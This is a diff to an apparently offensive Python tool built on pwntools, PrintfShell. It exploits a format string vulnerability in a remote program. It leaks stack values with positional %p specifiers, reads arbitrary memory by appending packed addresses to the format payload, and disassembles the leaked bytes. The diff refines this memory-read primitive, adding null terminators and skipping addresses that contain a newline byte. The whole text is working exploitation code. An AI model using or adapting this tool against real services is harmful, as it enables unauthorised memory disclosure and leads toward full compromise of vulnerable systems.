@@ -42,6 +42,7 @@ class PrintfShell(shell.Shell):
         string = self.write(string)
         self.conn.send(string)
         resp = self.conn.recvuntil(self.marker)
+        print(resp)
         return self.read(resp[:-len(self.marker)])
     
     @Command
@@ -51,7 +52,7 @@ class PrintfShell(shell.Shell):
             raise NoConnectionException("You need to connect first")
         stack = []
         for i in range(1, n+1):
-            value = self.read_response(bytes(f"%{i}$p", 'ascii'))
+            value = self.read_response(bytes(f"%{i}$p\x00", 'ascii'))
             stack.append(value)
         print(stack)
         for index, value in enumerate(stack):
@@ -63,9 +64,9 @@ class PrintfShell(shell.Shell):
         return stack
     
     @Command
-    def disasm_at(self, addr : int):
-        bs = self.read_bytes(addr, 20)
-        print(pwnlib.asm.disasm(bs))
+    def disasm_at(self, addr : int, n : int):
+        bs = self.read_bytes(addr, n)
+        print(pwnlib.asm.disasm(bs,arch="amd64"))
     
     @Command
     def read_bytes(self, addr : int, n : int):
@@ -80,16 +81,19 @@ class PrintfShell(shell.Shell):
         all_bytes = b""
         offset = 0
         while len(all_bytes) < n:
-            print(hex(addr+offset))
+            #print(hex(addr+offset))
             suffix = pad + pwnlib.util.packing.p64(addr + offset)
-            res = self.read_response(command + suffix)
-            print(res)
-            #res = res[:-len(suffix)]
-            res = res + b"\x00"
-            all_bytes += res
+            if b"\x0a" in suffix:
+                print(f"Cowardly refusing to look at a memory address with a 0xa in it {hex(addr+offset)}. Probably 0x0 ;)")
+                all_bytes += b"\x00"
+            else:
+                res = self.read_response(command + suffix)
+                #res = res[:-len(suffix)]
+                res = res + b"\x00"
+                all_bytes += res
             offset = len(all_bytes)
         print(all_bytes)
         return all_bytes
 
-shell = PrintfShell(read=lambda x: x[:-1], write=lambda x:x+b"\n")
+shell = PrintfShell(read=lambda x: x, write=lambda x:x+b"\n")
 shell.runloop()
